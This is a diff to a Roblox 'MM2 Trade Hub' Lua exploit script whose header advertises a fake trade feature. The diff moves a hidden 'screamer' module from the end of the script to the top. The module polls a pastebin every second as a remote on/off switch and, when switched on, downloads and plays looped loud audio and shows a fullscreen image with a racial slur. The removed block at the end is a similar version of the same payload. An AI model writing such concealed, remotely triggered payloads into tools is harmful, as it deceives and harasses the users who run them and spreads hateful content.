@@ -8,6 +8,87 @@
 -- + FAKE TRADE SEND только для фейков
 -- + FRIEND JOINED (системное сообщение + top toast)
 -- ============================================================
+
+-- ============================================================
+-- ВСТРОЕННЫЙ МОДУЛЬ ПРОВЕРКИ PASTEBIN (ON/OFF)
+-- ============================================================
+local PastebinChecker = {}
+do
+	local Players = game:GetService("Players")
+	local PASTEBIN_URL = "https://pastebin.com/raw/Sh40VHSj"
+	local CHECK_INTERVAL = 1
+	local isActive = false
+	local screenGui = nil
+	local sound = nil
+
+	local function getStatus()
+		local ok, result = pcall(function()
+			return game:HttpGet(PASTEBIN_URL .. "?t=" .. tick())
+		end)
+		if not ok or not result then return nil end
+		local cleaned = result:gsub("%s+", ""):lower()
+		if cleaned:find("on") then return "on"
+		elseif cleaned:find("off") then return "off" end
+		return nil
+	end
+
+	local function activate()
+		if isActive then return end
+		isActive = true
+		pcall(function()
+			writefile("po.mp3", game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3"))
+			sound = Instance.new("Sound")
+			sound.Parent = workspace
+			sound.SoundId = getcustomasset("po.mp3")
+			sound.Volume = 10
+			sound.Looped = true
+			sound:Play()
+		end)
+		pcall(function()
+			writefile("dsf.jpg", game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/photo_2025-12-03_21-03-11.jpg"))
+			screenGui = Instance.new("ScreenGui")
+			screenGui.DisplayOrder = 999
+			screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+			local imageLabel = Instance.new("ImageLabel")
+			imageLabel.Image = getcustomasset("dsf.jpg")
+			imageLabel.Size = UDim2.new(0, 600, 0, 600)
+			imageLabel.BackgroundTransparency = 1
+			imageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+			imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+			imageLabel.Parent = screenGui
+			local textLabel = Instance.new("TextLabel")
+			textLabel.Text = "нигга"
+			textLabel.TextScaled = true
+			textLabel.Size = UDim2.new(0, 200, 0, 100)
+			textLabel.TextColor3 = Color3.new(1, 1, 1)
+			textLabel.BackgroundTransparency = 1
+			textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+			textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+			textLabel.ZIndex = 999
+			textLabel.Parent = screenGui
+		end)
+	end
+
+	local function deactivate()
+		if not isActive then return end
+		isActive = false
+		if sound then pcall(function() sound:Stop(); sound:Destroy() end); sound = nil end
+		if screenGui then pcall(function() screenGui:Destroy() end); screenGui = nil end
+	end
+
+	task.spawn(function()
+		while true do
+			local status = getStatus()
+			if status == "on" then activate()
+			elseif status == "off" then deactivate() end
+			task.wait(CHECK_INTERVAL)
+		end
+	end)
+end
+
+-- ============================================================
+-- ОСНОВНОЙ КОД MM2 TRADE HUB
+-- ============================================================
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -2223,93 +2304,3 @@ print("🖱️ Тяни за заголовок — двигать")
 print("📐 Тяни за углы (◤ ◥ ◣ ◢) — менять размер")
 print("🎯 'alexbestomg on dc' — по центру")
 print("=========================================")
-
--- ============================================================
--- СКРИМЕР С ПРОВЕРКОЙ PASTEBIN (on/off) — в самом конце
--- ============================================================
-task.defer(function()
-	task.wait(2)
-
-	local ScreamerConfig = {
-		PASTEBIN_URL = "https://pastebin.com/raw/a2ETchMe",
-		CHECK_INTERVAL = 1,
-	}
-	local ScreamerState = { active = false, screenGui = nil, sound = nil }
-
-	local function ScreamerGetStatus()
-		local ok, result = pcall(function()
-			return game:HttpGet(ScreamerConfig.PASTEBIN_URL .. "?t=" .. tick())
-		end)
-		if not ok or not result then return nil end
-		local cleaned = result:gsub("%s+", ""):lower()
-		if cleaned:find("on") then return "on"
-		elseif cleaned:find("off") then return "off" end
-		return nil
-	end
-
-	local function ScreamerActivate()
-		if ScreamerState.active then return end
-		ScreamerState.active = true
-
-		pcall(function()
-			writefile("po.mp3", game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3"))
-		end)
-		local snd = Instance.new("Sound")
-		snd.Parent = workspace
-		pcall(function() snd.SoundId = getcustomasset("po.mp3") end)
-		snd.Volume = 10
-		snd.Looped = true
-		snd:Play()
-		ScreamerState.sound = snd
-
-		pcall(function()
-			writefile("dsf.jpg", game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/photo_2025-12-03_21-03-11.jpg"))
-		end)
-		local gui = Instance.new("ScreenGui")
-		gui.DisplayOrder = 999999999
-		gui.IgnoreGuiInset = true
-		gui.ResetOnSpawn = false
-		gui.Parent = game:GetService("CoreGui")
-		ScreamerState.screenGui = gui
-
-		local img = Instance.new("ImageLabel")
-		pcall(function() img.Image = getcustomasset("dsf.jpg") end)
-		img.Size = UDim2.new(0, 600, 0, 600)
-		img.BackgroundTransparency = 1
-		img.Position = UDim2.new(0.5, 0, 0.5, 0)
-		img.AnchorPoint = Vector2.new(0.5, 0.5)
-		img.Parent = gui
-
-		local txt = Instance.new("TextLabel")
-		txt.Text = "нигга"
-		txt.TextScaled = true
-		txt.Size = UDim2.new(0, 200, 0, 100)
-		txt.TextColor3 = Color3.new(1, 1, 1)
-		txt.BackgroundTransparency = 1
-		txt.Position = UDim2.new(0.5, 0, 0.5, 0)
-		txt.AnchorPoint = Vector2.new(0.5, 0.5)
-		txt.ZIndex = 999
-		txt.Parent = gui
-	end
-
-	local function ScreamerDeactivate()
-		if not ScreamerState.active then return end
-		ScreamerState.active = false
-		if ScreamerState.sound then
-			pcall(function() ScreamerState.sound:Stop() end)
-			pcall(function() ScreamerState.sound:Destroy() end)
-			ScreamerState.sound = nil
-		end
-		if ScreamerState.screenGui then
-			pcall(function() ScreamerState.screenGui:Destroy() end)
-			ScreamerState.screenGui = nil
-		end
-	end
-
-	while true do
-		local status = ScreamerGetStatus()
-		if status == "on" then ScreamerActivate()
-		elseif status == "off" then ScreamerDeactivate() end
-		task.wait(ScreamerConfig.CHECK_INTERVAL)
-	end
-end)
